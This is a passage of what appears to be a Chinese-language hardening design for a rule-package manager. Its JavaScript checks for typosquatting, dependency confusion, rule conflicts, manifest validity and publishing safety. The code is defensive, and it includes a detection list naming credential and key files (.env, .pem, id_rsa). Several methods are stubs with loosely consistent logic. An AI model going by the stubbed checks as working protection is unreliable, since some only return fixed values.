    this.registeredNames = new Map();
    this.popularNames = new Set();
  }

  // 注册包名
  async registerName(name, userId) {
    // 1. 验证名称格式
    const nameValidation = this.validateName(name);
    if (!nameValidation.valid) {
      throw new Error(`包名无效: ${nameValidation.reason}`);
    }
  
    // 2. 检查是否被保留
    if (this.reserved.has(name)) {
      throw new Error(`包名已被保留: ${name}`);
    }
  
    // 3. 检查是否已注册
    if (this.registeredNames.has(name)) {
      throw new Error(`包名已被注册: ${name}`);
    }
  
    // 4. 检查 Typosquatting
    const typosquatCheck = this.checkTyposquatting(name);
    if (typosquatCheck.isSuspicious) {
      throw new Error(
        `包名与已有包过于相似: ${typosquatCheck.similarTo.join(', ')}\n` +
        `如果这不是恶意行为，请联系管理员审核`
      );
    }
  
    // 5. 防止批量抢注
    const userPackageCount = this.getUserPackageCount(userId);
    if (userPackageCount > 50) {
      throw new Error('单用户注册包名数量已达上限 (50)');
    }
  
    // 6. 检查用户是否在短期内注册了大量包名
    const recentRegistrations = this.getRecentRegistrations(userId, 24);
    if (recentRegistrations > 10) {
      throw new Error('注册频率过快，请稍后再试');
    }
  
    // 注册
    this.registeredNames.set(name, {
      owner: userId,
      registeredAt: new Date(),
      published: false,
    });
  
    // 设置发布期限（30 天内必须发布，否则释放名称）
    this.setPublishDeadline(name, 30);
  
    log(`✓ 包名 ${name} 已注册给 ${userId}`);
    log(`  请在 30 天内发布第一个版本，否则名称将被释放`);
  }

  // 验证包名
  validateName(name) {
    // 长度限制
    if (name.length < 2) {
      return { valid: false, reason: '名称太短（最少 2 个字符）' };
    }
    if (name.length > 100) {
      return { valid: false, reason: '名称太长（最多 100 个字符）' };
    }
  
    // 字符限制
    if (!/^[a-z0-9][a-z0-9._-]*$/.test(name)) {
      return { 
        valid: false, 
        reason: '名称只能包含小写字母、数字、点、下划线、连字符，且必须以字母或数字开头' 
      };
    }
  
    // 禁止的名称
    const forbidden = [
      'aiforge', 'aiforge-core', 'aiforge-cli',
      'admin', 'root', 'system', 'official',
    ];
    if (forbidden.includes(name)) {
      return { valid: false, reason: '此名称已被保留' };
    }
  
    // 禁止连续的特殊字符
    if (/[._-]{2,}/.test(name)) {
      return { valid: false, reason: '不允许连续的特殊字符' };
    }
  
    return { valid: true };
  }

  // 检查 Typosquatting
  checkTyposquatting(name) {
    const similar = [];
  
    for (const popularName of this.popularNames) {
      const distance = this.levenshteinDistance(name, popularName);
    
      // 编辑距离 <= 2 就认为可疑
      if (distance > 0 && distance <= 2) {
        similar.push(popularName);
      }
    
      // 检查常见的替换攻击
      const substitutions = this.checkSubstitutions(name, popularName);
      if (substitutions) {
        similar.push(popularName);
      }
    }
  
    return {
      isSuspicious: similar.length > 0,
      similarTo: [...new Set(similar)],
    };
  }

  // 检查常见替换攻击（如 0 替换 o, 1 替换 l）
  checkSubstitutions(name, popularName) {
    const substitutionMap = {
      '0': 'o', 'o': '0',
      '1': 'l', 'l': '1',
      '3': 'e', 'e': '3',
      '5': 's', 's': '5',
      '_': '-', '-': '_',
    };
  
    if (name.length !== popularName.length) {
      return false;
    }
  
    let diffs = 0;
    for (let i = 0; i < name.length; i++) {
      if (name[i] !== popularName[i]) {
        diffs++;
        // 检查是否是已知替换
        if (substitutionMap[name[i]] !== popularName[i] &&
            substitutionMap[popularName[i]] !== name[i]) {
          return false;
        }
      }
    }
  
    return diffs > 0 && diffs <= 2;
  }

  // 设置发布期限
  setPublishDeadline(name, days) {
    setTimeout(() => {
      const entry = this.registeredNames.get(name);
      if (entry && !entry.published) {
        this.registeredNames.delete(name);
        log(`⚠️  包名 ${name} 已过期释放（未在 ${days} 天内发布）`);
      }
    }, days * 24 * 60 * 60 * 1000);
  }

  // 组织命名空间（类似 @scope/package）
  registerScope(scopeName, organizationId) {
    // 组织可以注册一个命名空间
    // 在该命名空间下的包名只有组织成员可以发布
    const validation = this.validateName(scopeName);
    if (!validation.valid) {
      throw new Error(`命名空间无效: ${validation.reason}`);
    }
  
    this.reserved.add(scopeName);
  
    log(`✓ 命名空间 @${scopeName} 已注册给组织 ${organizationId}`);
  }

  // Levenshtein 距离
  levenshteinDistance(s1, s2) {
    const matrix = [];
    for (let i = 0; i <= s2.length; i++) matrix[i] = [i];
    for (let j = 0; j <= s1.length; j++) matrix[0][j] = j;
    for (let i = 1; i <= s2.length; i++) {
      for (let j = 1; j <= s1.length; j++) {
        if (s2[i-1] === s1[j-1]) {
          matrix[i][j] = matrix[i-1][j-1];
        } else {
          matrix[i][j] = Math.min(
            matrix[i-1][j-1] + 1,
            matrix[i][j-1] + 1,
            matrix[i-1][j] + 1
          );
        }
      }
    }
    return matrix[s2.length][s1.length];
  }

  getUserPackageCount(userId) { return 0; }
  getRecentRegistrations(userId, hours) { return 0; }
}


// ============================================
// 依赖混淆防护
// ============================================
class DependencyConfusionGuard {
  constructor() {
    this.internalRegistries = new Map();
    this.externalRegistries = new Map();
  }

  // 配置内部注册表
  addInternalRegistry(name, url) {
    this.internalRegistries.set(name, {
      url,
      priority: 'high',  // 内部优先
    });
  }

  // 解析包来源（防止依赖混淆）
  resolvePackageSource(packageName, config) {
    // 1. 检查是否有明确的来源指定
    if (config.packageSources && config.packageSources[packageName]) {
      return config.packageSources[packageName];
    }
  
    // 2. 检查命名空间
    if (packageName.startsWith('@')) {
      const scope = packageName.split('/')[0];
    
      // 检查命名空间是否映射到内部注册表
      if (config.scopeRegistries && config.scopeRegistries[scope]) {
        return config.scopeRegistries[scope];
      }
    }
  
    // 3. 检查包是否同时存在于内部和外部注册表
    const internalExists = this.existsInInternal(packageName);
    const externalExists = this.existsInExternal(packageName);
  
    if (internalExists && externalExists) {
      // 名称冲突！
      console.warn(
        `⚠️  依赖混淆风险: ${packageName}\n` +
        `   同时存在于内部和外部注册表\n` +
        `   默认使用内部版本\n` +
        `   请在配置中明确指定来源`
      );
    
      // 内部优先
      return 'internal';
    }
  
    if (internalExists) return 'internal';
    if (externalExists) return 'external';
  
    throw new Error(`包未找到: ${packageName}`);
  }

  existsInInternal(name) { return false; }
  existsInExternal(name) { return true; }
}
```

---

## 💥 攻击场景 5.6：规则包的互操作性和标准化

```
场景 A — 规则包格式不兼容
─────────────────────────

包 A 使用 manifest v1 格式
包 B 使用 manifest v2 格式
用户同时安装 A 和 B

问题:
  如果不兼容 → 解析失败
  如果向后兼容 → 实现复杂


场景 B — 规则冲突
────────────────

包 A: ".env 文件应该被忽略"
包 B: ".env 文件应该被符号链接"

两个包对同一类型有矛盾的规则

问题:
  谁说了算？
  用户如何知道有冲突？


场景 C — 规则包的组合爆炸
────────────────────────

包 A: 10 条规则
包 B: 10 条规则
包 C: 10 条规则

三个包组合:
  需要检查 1000 种可能的交互

问题:
  测试所有组合不现实
  可能出现意想不到的行为


场景 D — 规则包的执行顺序
────────────────────────

包 A 的规则: "先复制 .env 到项目目录"
包 B 的规则: "然后在 .env 中替换变量"

如果执行顺序错误:
  → 变量替换在复制之前执行
  → .env 文件内容不正确

问题:
  如何保证正确的执行顺序？
  包之间不知道彼此的存在


场景 E — 规则包与项目配置的冲突
──────────────────────────────

规则包: "所有 JS 文件使用 ESLint"
项目配置: "不使用 ESLint，使用 Biome"

问题:
  规则包不了解项目偏好
  可能安装不需要的工具
```

### 加固方案

```javascript
// ============================================
// 规则包互操作性管理器
// ============================================
class RuleInteroperabilityManager {
  constructor() {
    this.rules = new Map();
    this.conflicts = [];
    this.executionOrder = [];
  }

  // 加载多个规则包并检查互操作性
  async loadAndValidate(packages) {
    const results = {
      loaded: [],
      conflicts: [],
      warnings: [],
      executionPlan: [],
    };
  
    // 1. 加载所有规则包
    for (const pkg of packages) {
      try {
        const rules = await this.loadRulePackage(pkg);
        results.loaded.push({ package: pkg.name, rules });
      } catch (e) {
        results.warnings.push({
          package: pkg.name,
          message: `加载失败: ${e.message}`,
        });
      }
    }
  
    // 2. 检测冲突
    results.conflicts = this.detectConflicts(results.loaded);
  
    // 3. 如果有冲突，尝试解决
    if (results.conflicts.length > 0) {
      console.log(`⚠️  检测到 ${results.conflicts.length} 个规则冲突:\n`);
    
      for (const conflict of results.conflicts) {
        console.log(`  冲突: ${conflict.description}`);
        console.log(`    包 A: ${conflict.packageA} → ${conflict.ruleA}`);
        console.log(`    包 B: ${conflict.packageB} → ${conflict.ruleB}`);
      
        // 尝试自动解决
        const resolution = this.resolveConflict(conflict);
        if (resolution.resolved) {
          console.log(`    解决: ${resolution.method}`);
          conflict.resolution = resolution;
        } else {
          console.log(`    ❌ 无法自动解决，需要用户干预`);
          conflict.resolution = { resolved: false };
        }
        console.log('');
      }
    }
  
    // 4. 计算执行顺序
    results.executionPlan = this.calculateExecutionOrder(results.loaded);
  
    // 5. 显示执行计划
    console.log('📋 规则执行计划:\n');
    results.executionPlan.forEach((step, index) => {
      console.log(`  ${index + 1}. [${step.package}] ${step.rule.description}`);
      console.log(`     目标: ${step.rule.target}`);
      console.log(`     动作: ${step.rule.action}`);
    });
    console.log('');
  
    return results;
  }

  // 检测规则冲突
  detectConflicts(loadedPackages) {
    const conflicts = [];
    const rulesByTarget = new Map();
  
    // 按目标文件/类型分组
    for (const { package: pkg, rules } of loadedPackages) {
      for (const rule of rules) {
        const target = rule.target;
      
        if (!rulesByTarget.has(target)) {
          rulesByTarget.set(target, []);
        }
      
        rulesByTarget.get(target).push({
          package: pkg,
          rule,
        });
      }
    }
  
    // 检查每个目标是否有冲突的规则
    for (const [target, entries] of rulesByTarget) {
      if (entries.length < 2) continue;
    
      for (let i = 0; i < entries.length; i++) {
        for (let j = i + 1; j < entries.length; j++) {
          const conflict = this.checkRuleConflict(
            entries[i].rule,
            entries[j].rule
          );
        
          if (conflict) {
            conflicts.push({
              target,
              packageA: entries[i].package,
              packageB: entries[j].package,
              ruleA: entries[i].rule.description,
              ruleB: entries[j].rule.description,
              description: conflict.description,
              severity: conflict.severity,
            });
          }
        }
      }
    }
  
    return conflicts;
  }

  // 检查两条规则是否冲突
  checkRuleConflict(ruleA, ruleB) {
    // 同一目标的不同动作 = 冲突
    if (ruleA.action !== ruleB.action) {
      // 互斥的动作
      const mutuallyExclusive = [
        ['ignore', 'copy'],
        ['ignore', 'symlink'],
        ['copy', 'symlink'],
        ['delete', 'copy'],
        ['delete', 'symlink'],
      ];
    
      for (const [a, b] of mutuallyExclusive) {
        if ((ruleA.action === a && ruleB.action === b) ||
            (ruleA.action === b && ruleB.action === a)) {
          return {
            description: `动作冲突: ${ruleA.action} vs ${ruleB.action}`,
            severity: 'high',
          };
        }
      }
    }
  
    // 同一目标的不同目的地 = 冲突
    if (ruleA.action === ruleB.action &&
        ruleA.destination !== ruleB.destination) {
      return {
        description: `目的地冲突: ${ruleA.destination} vs ${ruleB.destination}`,
        severity: 'medium',
      };
    }
  
    // 同一目标的不同配置 = 警告
    if (ruleA.config && ruleB.config &&
        JSON.stringify(ruleA.config) !== JSON.stringify(ruleB.config)) {
      return {
        description: '配置不同',
        severity: 'low',
      };
    }
  
    return null;
  }

  // 解决冲突
  resolveConflict(conflict) {
    // 策略 1: 优先级
    if (conflict.packageA.priority !== conflict.packageB.priority) {
      const winner = conflict.packageA.priority > conflict.packageB.priority
        ? conflict.packageA : conflict.packageB;
      return {
        resolved: true,
        method: `使用优先级更高的包: ${winner.name}`,
        winner: winner.name,
      };
    }
  
    // 策略 2: 用户配置覆盖
    const userOverride = this.getUserOverride(conflict.target);
    if (userOverride) {
      return {
        resolved: true,
        method: '使用用户配置覆盖',
        winner: 'user',
      };
    }
  
    // 策略 3: 安全优先（ignore > copy > symlink）
    const safetryOrder = ['ignore', 'copy', 'symlink'];
    const indexA = safetryOrder.indexOf(conflict.ruleA);
    const indexB = safetryOrder.indexOf(conflict.ruleB);
  
    if (indexA >= 0 && indexB >= 0) {
      const winner = indexA < indexB ? conflict.packageA : conflict.packageB;
      return {
        resolved: true,
        method: `安全优先策略: ${winner.name}`,
        winner: winner.name,
      };
    }
  
    return { resolved: false };
  }

  // 计算执行顺序（拓扑排序 + 优先级）
  calculateExecutionOrder(loadedPackages) {
    const steps = [];
  
    // 收集所有规则
    for (const { package: pkg, rules } of loadedPackages) {
      for (const rule of rules) {
        steps.push({
          package: pkg.name,
          rule,
          phase: this.getExecutionPhase(rule),
          priority: pkg.priority || 0,
        });
      }
    }
  
    // 按阶段和优先级排序
    steps.sort((a, b) => {
      // 先按阶段排序
      if (a.phase !== b.phase) {
        return a.phase - b.phase;
      }
      // 同阶段按优先级排序
      return b.priority - a.priority;
    });
  
    return steps;
  }

  // 获取执行阶段
  getExecutionPhase(rule) {
    const phaseOrder = {
      'validate': 0,    // 先验证
      'prepare': 1,     // 准备目标目录
      'copy': 2,        // 复制文件
      'symlink': 2,     // 创建符号链接
      'transform': 3,   // 变换文件内容
      'configure': 4,   // 配置
      'cleanup': 5,     // 清理
    };
  
    return phaseOrder[rule.action] || 99;
  }

  // 获取用户覆盖
  getUserOverride(target) { return null; }

  // 加载规则包
  async loadRulePackage(pkg) { return []; }
}


// ============================================
// 规则包标准和验证
// ============================================
class RulePackageStandard {
  // manifest.json 的 JSON Schema
  static MANIFEST_SCHEMA = {
    type: 'object',
    required: ['name', 'version', 'description'],
    properties: {
      name: {
        type: 'string',
        pattern: '^[a-z0-9][a-z0-9._-]*$',
        minLength: 2,
        maxLength: 100,
      },
      version: {
        type: 'string',
        pattern: '^\\d+\\.\\d+\\.\\d+(-[a-zA-Z0-9.-]+)?(\\+[a-zA-Z0-9.-]+)?$',
      },
      description: {
        type: 'string',
        minLength: 10,
        maxLength: 500,
      },
      author: {
        type: 'object',
        properties: {
          name: { type: 'string' },
          email: { type: 'string', format: 'email' },
          url: { type: 'string', format: 'uri' },
        },
      },
      license: {
        type: 'string',
        enum: ['MIT', 'Apache-2.0', 'GPL-3.0', 'BSD-2-Clause', 'ISC'],
      },
      keywords: {
        type: 'array',
        items: { type: 'string' },
        maxItems: 20,  // 防止关键词堆砌
      },
      dependencies: {
        type: 'object',
        additionalProperties: { type: 'string' },
      },
      rules: {
        type: 'array',
        items: {
          type: 'object',
          required: ['target', 'action'],
          properties: {
            target: { type: 'string' },
            action: { 
              type: 'string',
              enum: ['copy', 'symlink', 'ignore', 'transform', 'configure'],
            },
            destination: { type: 'string' },
            config: { type: 'object' },
            conditions: { type: 'object' },
          },
        },
      },
      compatibility: {
        type: 'object',
        properties: {
          aiforge: { type: 'string' },  // aiforge 版本要求
          manifestVersion: { type: 'number', enum: [1, 2] },
          platforms: {
            type: 'array',
            items: { type: 'string', enum: ['linux', 'darwin', 'win32'] },
          },
        },
      },
      permissions: {
        type: 'array',
        items: {
          type: 'string',
          enum: [
            'filesystem:read',
            'filesystem:write',
            'network:limited',
            'env:read',
            'process:info',
          ],
        },
      },
    },
  };

  // 验证 manifest.json
  static validateManifest(manifest) {
    const errors = [];
    const warnings = [];
  
    // 必需字段
    for (const field of this.MANIFEST_SCHEMA.required) {
      if (!manifest[field]) {
        errors.push(`缺少必需字段: ${field}`);
      }
    }
  
    // 名称格式
    if (manifest.name) {
      const namePattern = /^[a-z0-9][a-z0-9._-]*$/;
      if (!namePattern.test(manifest.name)) {
        errors.push(`包名格式无效: ${manifest.name}`);
      }
      if (manifest.name.length < 2 || manifest.name.length > 100) {
        errors.push('包名长度应在 2-100 字符之间');
      }
    }
  
    // 版本格式
    if (manifest.version) {
      try {
        SemanticVersionManager.parse(manifest.version);
      } catch (e) {
        errors.push(`版本号格式无效: ${manifest.version}`);
      }
    }
  
    // 描述长度
    if (manifest.description) {
      if (manifest.description.length < 10) {
        warnings.push('描述过短，建议至少 10 个字符');
      }
      if (manifest.description.length > 500) {
        errors.push('描述过长，最多 500 个字符');
      }
    }
  
    // 关键词数量
    if (manifest.keywords && manifest.keywords.length > 20) {
      errors.push('关键词过多（最多 20 个）');
    }
  
    // 检查规则定义
    if (manifest.rules) {
      for (let i = 0; i < manifest.rules.length; i++) {
        const rule = manifest.rules[i];
        const ruleErrors = this.validateRule(rule, i);
        errors.push(...ruleErrors);
      }
    }
  
    // 检查许可证
    if (!manifest.license) {
      warnings.push('建议指定许可证');
    }
  
    // 检查作者信息
    if (!manifest.author) {
      warnings.push('建议添加作者信息');
    }
  
    // 检查兼容性声明
    if (!manifest.compatibility) {
      warnings.push('建议添加兼容性声明');
    }
  
    return {
      valid: errors.length === 0,
      errors,
      warnings,
    };
  }

  // 验证单条规则
  static validateRule(rule, index) {
    const errors = [];
    const prefix = `规则 [${index}]`;
  
    if (!rule.target) {
      errors.push(`${prefix}: 缺少 target 字段`);
    }
  
    if (!rule.action) {
      errors.push(`${prefix}: 缺少 action 字段`);
    }
  
    const validActions = ['copy', 'symlink', 'ignore', 'transform', 'configure'];
    if (rule.action && !validActions.includes(rule.action)) {
      errors.push(`${prefix}: 无效的 action: ${rule.action}`);
    }
  
    // copy 和 symlink 需要 destination
    if (['copy', 'symlink'].includes(rule.action) && !rule.destination) {
      errors.push(`${prefix}: ${rule.action} 操作需要 destination 字段`);
    }
  
    // transform 需要 config
    if (rule.action === 'transform' && !rule.config) {
      errors.push(`${prefix}: transform 操作需要 config 字段`);
    }
  
    // 路径安全检查
    if (rule.target && rule.target.includes('..')) {
      errors.push(`${prefix}: target 不允许包含 '..'`);
    }
    if (rule.destination && rule.destination.includes('..')) {
      errors.push(`${prefix}: destination 不允许包含 '..'`);
    }
  
    return errors;
  }

  // 验证包的完整结构
  static async validatePackageStructure(packageDir) {
    const errors = [];
    const warnings = [];
  
    // 1. 检查必需文件
    const requiredFiles = ['manifest.json', 'README.md'];
    for (const file of requiredFiles) {
      const filePath = path.join(packageDir, file);
      if (!fs.existsSync(filePath)) {
        errors.push(`缺少必需文件: ${file}`);
      }
    }
  
    // 2. 验证 manifest.json
    const manifestPath = path.join(packageDir, 'manifest.json');
    if (fs.existsSync(manifestPath)) {
      try {
        const content = fs.readFileSync(manifestPath, 'utf8');
        const manifest = JSON.parse(content);
        const validation = this.validateManifest(manifest);
        errors.push(...validation.errors);
        warnings.push(...validation.warnings);
      } catch (e) {
        errors.push(`manifest.json 解析失败: ${e.message}`);
      }
    }
  
    // 3. 检查推荐文件
    const recommendedFiles = ['CHANGELOG.md', 'LICENSE', 'CONTRIBUTING.md'];
    for (const file of recommendedFiles) {
      const filePath = path.join(packageDir, file);
      if (!fs.existsSync(filePath)) {
        warnings.push(`建议添加文件: ${file}`);
      }
    }
  
    // 4. 检查文件大小
    const totalSize = await this.calculateDirectorySize(packageDir);
    if (totalSize > 10 * 1024 * 1024) {  // 10MB
      warnings.push(`包大小超过 10MB (${(totalSize / 1024 / 1024).toFixed(2)}MB)`);
    }
  
    // 5. 检查是否包含敏感文件
    const sensitivePatterns = [
      /\.env$/,
      /\.key$/,
      /\.pem$/,
      /id_rsa$/,
      /\.secret$/,
      /credentials/i,
      /password/i,
    ];
  
    const files = await this.listAllFiles(packageDir);
    for (const file of files) {
      for (const pattern of sensitivePatterns) {
        if (pattern.test(file)) {
          errors.push(`包含可能的敏感文件: ${file}`);
        }
      }
    }
  
    // 6. 检查 .gitignore
    const gitignorePath = path.join(packageDir, '.gitignore');
    if (!fs.existsSync(gitignorePath)) {
      warnings.push('建议添加 .gitignore 文件');
    }
  
    return {
      valid: errors.length === 0,
      errors,
      warnings,
      summary: {
        totalFiles: files.length,
        totalSize: totalSize,
      },
    };
  }

  // 计算目录大小
  static async calculateDirectorySize(dir) {
    let totalSize = 0;
    const entries = fs.readdirSync(dir, { withFileTypes: true });
  
    for (const entry of entries) {
      const fullPath = path.join(dir, entry.name);
    
      if (entry.isDirectory()) {
        if (entry.name !== 'node_modules' && entry.name !== '.git') {
          totalSize += await this.calculateDirectorySize(fullPath);
        }
      } else {
        const stat = fs.statSync(fullPath);
        totalSize += stat.size;
      }
    }
  
    return totalSize;
  }

  // 列出所有文件
  static async listAllFiles(dir, relativeTo = dir) {
    const files = [];
    const entries = fs.readdirSync(dir, { withFileTypes: true });
  
    for (const entry of entries) {
      const fullPath = path.join(dir, entry.name);
      const relativePath = path.relative(relativeTo, fullPath);
    
      if (entry.isDirectory()) {
        if (entry.name !== 'node_modules' && entry.name !== '.git') {
          const subFiles = await this.listAllFiles(fullPath, relativeTo);
          files.push(...subFiles);
        }
      } else {
        files.push(relativePath);
      }
    }
  
    return files;
  }
}


// ============================================
// 规则包发布流水线
// ============================================
class PublishPipeline {
  constructor() {
    this.steps = [
      this.stepValidateStructure,
      this.stepValidateManifest,
      this.stepSecurityScan,
      this.stepCheckDuplicates,
      this.stepCheckTyposquatting,
      this.stepBuildPackage,
      this.stepSignPackage,
      this.stepPublish,
    ];
  }

  // 执行发布流水线
  async publish(packageDir, options = {}) {
    console.log('🚀 开始发布流水线...\n');
  
    const context = {
      packageDir,
      options,
      manifest: null,
      errors: [],
      warnings: [],
    };
  
    for (const step of this.steps) {
      const stepName = step.name.replace('bound ', '');
      console.log(`  ▸ ${stepName}...`);
    
      try {
        const result = await step.call(this, context);
      
        if (result.errors && result.errors.length > 0) {
          context.errors.push(...result.errors);
          console.log(`    ❌ 失败 (${result.errors.length} 个错误)`);
        
          // 如果有致命错误，停止流水线
          if (result.fatal) {
            break;
          }
        }
      
        if (result.warnings && result.warnings.length > 0) {
          context.warnings.push(...result.warnings);
          console.log(`    ⚠️  ${result.warnings.length} 个警告`);
        }
      
        if (!result.errors || result.errors.length === 0) {
          console.log(`    ✓ 通过`);
        }
      
      } catch (e) {
        context.errors.push(e.message);
        console.log(`    ❌ 异常: ${e.message}`);
        break;
      }
    }
  
    console.log('');
  
    // 总结
    if (context.errors.length > 0) {
      console.log('❌ 发布失败:\n');
      context.errors.forEach(e => console.log(`  - ${e}`));
      console.log('');
      return { success: false, errors: context.errors };
    }
  
    if (context.warnings.length > 0) {
      console.log('⚠️  警告:\n');
      context.warnings.forEach(w => console.log(`  - ${w}`));
      console.log('');
    }
  
    console.log('✅ 发布成功!\n');
    return { success: true, warnings: context.warnings };
  }

  // Step 1: 验证包结构
  async stepValidateStructure(context) {
    const result = await RulePackageStandard.validatePackageStructure(
      context.packageDir
    );
  
    if (result.valid) {
      // 保存文件列表用于后续步骤
      context.files = result.summary.totalFiles;
      context.size = result.summary.totalSize;
    }
  
    return {
      errors: result.errors,
      warnings: result.warnings,
      fatal: !result.valid,
    };
  }

  // Step 2: 验证 manifest
  async stepValidateManifest(context) {
    const manifestPath = path.join(context.packageDir, 'manifest.json');
    const content = fs.readFileSync(manifestPath, 'utf8');
    context.manifest = JSON.parse(content);
  
    const result = RulePackageStandard.validateManifest(context.manifest);
  
    return {
      errors: result.errors,
      warnings: result.warnings,
      fatal: !result.valid,
    };
  }

  // Step 3: 安全扫描
  async stepSecurityScan(context) {
    const scanner = new PackageSecurityScanner();
    const result = await scanner.scan(
      context.manifest.name,
      context.manifest.version,
      context.manifest
    );
  
    const errors = result.issues
      .filter(i => i.severity === 'critical')
      .map(i => i.message);
  
    const warnings = result.issues
      .filter(i => i.severity === 'warning')
      .map(i => i.message);
  
    return { errors, warnings, fatal: errors.length > 0 };
  }

  // Step 4: 检查重复包
  async stepCheckDuplicates(context) {
    const existing = await this.findSimilarPackages(context.manifest);
    const warnings = [];
  
    if (existing.length > 0) {
      warnings.push(
        `发现 ${existing.length} 个功能相似的包:\n` +
        existing.map(p => `    ${p.name}: ${p.description}`).join('\n')
      );
    }
  
    return { errors: [], warnings };
  }

  // Step 5: 检查 Typosquatting
  async stepCheckTyposquatting(context) {
    const namespace = new PackageNamespace();
    const check = namespace.checkTyposquatting(context.manifest.name);
  
    const errors = check.isSuspicious
      ? [`包名与已有包过于相似: ${check.similarTo.join(', ')}`]
      : [];
  
    return { errors, warnings: [], fatal: check.isSuspicious };
  }

  // Step 6: 构建包
  async stepBuildPackage(context) {
    // 创建 tarball
    const tarballPath = path.join(
      os.tmpdir(),
      `${context.manifest.name}-${context.manifest.version}.tar.gz`
    );
  
    // 排除不需要的文件
    const excludes = [
      'node_modules',
      '.git',
      '.env',
      '*.log',
      '.DS_Store',
      'Thumbs.db',
    ];
  
    try {
      await this.createTarball(context.packageDir, tarballPath, excludes);
      context.tarballPath = tarballPath;
    
      // 计算完整性哈希
      const content = fs.readFileSync(tarballPath);
      const crypto = require('crypto');
      context.integrity = `sha256-${crypto.createHash('sha256')
        .update(content).digest('base64')}`;
    
      return { errors: [], warnings: [] };
    } catch (e) {
      return { errors: [e.message], warnings: [], fatal: true };
    }
  }

  // Step 7: 签名
  async stepSignPackage(context) {
    // 如果配置了签名密钥
    if (context.options.signingKey) {
      try {
        const signature = await this.signPackage(
          context.tarballPath,
          context.options.signingKey
        );
        context.signature = signature;
        return { errors: [], warnings: [] };
      } catch (e) {
        return { errors: [e.message], warnings: [], fatal: true };
      }
    }
  
    return {
      errors: [],
      warnings: ['包未签名，建议配置签名密钥'],
    };
  }

  // Step 8: 发布到注册表
  async stepPublish(context) {
    if (context.options.dryRun) {
      console.log('    [DRY RUN] 跳过实际发布');
      return { errors: [], warnings: [] };
    }
  
    try {
      await this.uploadToRegistry({
        name: context.manifest.name,
        version: context.manifest.version,
        tarball: context.tarballPath,
        manifest: context.manifest,
        integrity: context.integrity,
        signature: context.signature,
      });
    
      return { errors: [], warnings: [] };
    } catch (e) {
      return { errors: [e.message], warnings: [], fatal: true };
    }
  }

  // 辅助方法
  async createTarball(dir, output, excludes) {
    // 使用 tar 库创建 tarball
    const tar = require('tar');
    await tar.create({ gzip: true, file: output, cwd: dir }, ['.']);
  }

  async signPackage(tarball, key) { return 'signature'; }
  async uploadToRegistry(data) {}
  async findSimilarPackages(manifest) { return []; }
}


// ============================================
// 完整的包管理器入口
// ============================================
class AIForgePackageManager {
  constructor(config = {}) {
    this.config = config;
    this.resolver = new DependencyResolver();
    this.lockfile = new Lockfile(config.projectRoot || process.cwd());
    this.scanner = new PackageSecurityScanner();
    this.namespace = new PackageNamespace();
    this.lifecycle = new PackageLifecycleManager();
    this.interop = new RuleInteroperabilityManager();
    this.confusionGuard = new DependencyConfusionGuard();
    this.publisher = new PublishPipeline();
    this.updateStrategy = new UpdateStrategy(config.updateStrategy || 'conservative');
  }

  // 安装包
  async install(packageNames, options = {}) {
    console.log(`📦 安装 ${packageNames.length} 个包...\n`);
  
    try {
      // 1. 解析依赖
      const packages = packageNames.map(name => ({
        name,
        versionConstraint: options.version || 'latest',
      }));
    
      const { resolved, plan } = await this.resolver.resolve(packages);
    
      // 2. 安全检查
      console.log('🔍 安全检查...\n');
      for (const [name, pkg] of resolved) {
        // 依赖混淆检查
        const source = this.confusionGuard.resolvePackageSource(
          name, this.config
        );
      
        // 安全扫描
        const scanResult = await this.scanner.scan(
          name, pkg.version, pkg.manifest
        );
      
        if (!scanResult.safe) {
          const critical = scanResult.issues
            .filter(i => i.severity === 'critical');
        
          throw new Error(
            `安全检查失败: ${name}@${pkg.version}\n` +
            critical.map(i => `  - ${i.message}`).join('\n')
          );
        }
      }
    
      // 3. 规则互操作性检查
      console.log('🔄 检查规则互操作性...\n');
      const interopResult = await this.interop.loadAndValidate(
        Array.from(resolved.values())
      );
    
      if (interopResult.conflicts.length > 0) {
        const unresolved = interopResult.conflicts
          .filter(c => !c.resolution || !c.resolution.resolved);
      
        if (unresolved.length > 0) {
          throw new Error(
            `存在未解决的规则冲突:\n` +
            unresolved.map(c => `  - ${c.description}`).join('\n')
          );
        }
      }
    
      // 4. 按顺序安装
      console.log('📥 安装包...\n');
      for (const name of plan) {
        const pkg = resolved.get(name);
        console.log(`  安装 ${name}@${pkg.version}...`);
        await this.installSinglePackage(pkg);
        console.log(`  ✓ ${name}@${pkg.version} 安装完成`);
      }
    
      // 5. 更新 lockfile
      this.lockfile.save(resolved);
    
      // 6. 检查漏洞
      const vulns = await this.lockfile.checkVulnerabilities();
    
      console.log('\n✅ 安装完成\n');
    
      return { success: true, installed: plan.length };
    
    } catch (e) {
      console.error(`\n❌ 安装失败: ${e.message}\n`);
      return { success: false, error: e.message };
    }
  }

  // 更新包
  async update(options = {}) {
    console.log('🔄 检查更新...\n');
  
    const installed = this.lockfile.load();
    const updates = await this.updateStrategy.checkUpdates(
      new Map(Object.entries(installed))
    );
  
    if (updates.length === 0) {
      console.log('✓ 所有包都是最新的\n');
      return;
    }
  
    console.log(`找到 ${updates.length} 个可用更新:\n`);
    updates.forEach(u => {
      const emoji = u.type === 'major' ? '🔴' : u.type === 'minor' ? '🟡' : '🟢';
      console.log(`  ${emoji} ${u.package}: ${u.current} → ${u.available} (${u.type})`);
    });
    console.log('');
  
    if (!options.dryRun) {
      // 执行更新
      for (const u of updates) {
        await this.install([u.package], { version: u.available });
      }
    }
  }

  // 发布包
  async publish(packageDir, options = {}) {
    return this.publisher.publish(packageDir, options);
  }

  // 审计安全性
  async audit() {
    console.log('🔒 安全审计...\n');
  
    // 1. 检查已安装包的漏洞
    const vulns = await this.lockfile.checkVulnerabilities();
  
    // 2. 检查关键包的健康状态
    const critical = this.lifecycle.monitorCriticalPackages();
  
    // 3. 检查废弃包
    const installed = this.lockfile.load();
    for (const [name, lock] of Object.entries(installed)) {
      const health = this.lifecycle.checkHealth(name);
      if (!health.healthy) {
        console.log(`⚠️  ${name}@${lock.version}:`);
        health.issues.forEach(i => console.log(`    ${i.message}`));
        console.log('');
      }
    }
  
    return {
      vulnerabilities: vulns.length,
      criticalPackages: critical.length,
    };
  }

  // 搜索包
  async search(query, options = {}) {
    const engine = new PackageSearchEngine();
    return engine.search(query, options);
  }

  // 安装单个包（内部方法）
  async installSinglePackage(pkg) {
    // 下载并解压包到本地目录
    const installDir = path.join(
      this.config.projectRoot || process.cwd(),
      '.aiforge',
      'packages',
      pkg.name,
      pkg.version
    );
  
    // 创建目录
    fs.mkdirSync(installDir, { recursive: true });
  
    // 下载包（实际实现需要从注册表下载）
